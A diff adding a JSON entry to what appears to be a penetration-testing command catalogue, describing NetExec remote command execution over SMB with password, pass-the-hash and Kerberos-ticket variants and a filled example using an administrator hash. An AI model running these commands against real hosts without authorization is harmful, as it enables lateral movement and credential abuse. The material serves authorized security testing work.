@@ -1,0 +1,35 @@
+{
+  "id": "nxc-smb-exec",
+  "name": "NetExec SMB Command Exec",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -d '<domain>' -X 'whoami'",
+  "description": "Execute commands on a remote Windows host via SMB using NetExec",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "execution",
+    "shell",
+    "rce"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -d '<domain>' -X 'whoami'"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "nxc smb '<ip>' --use-kcache -d '<domain>' -X 'whoami'"
+    }
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'administrator' -H 'f29207796c9e6829aa1882b7cccfa36d' -d 'bastion.local' -X 'whoami'"
+  ]
+}
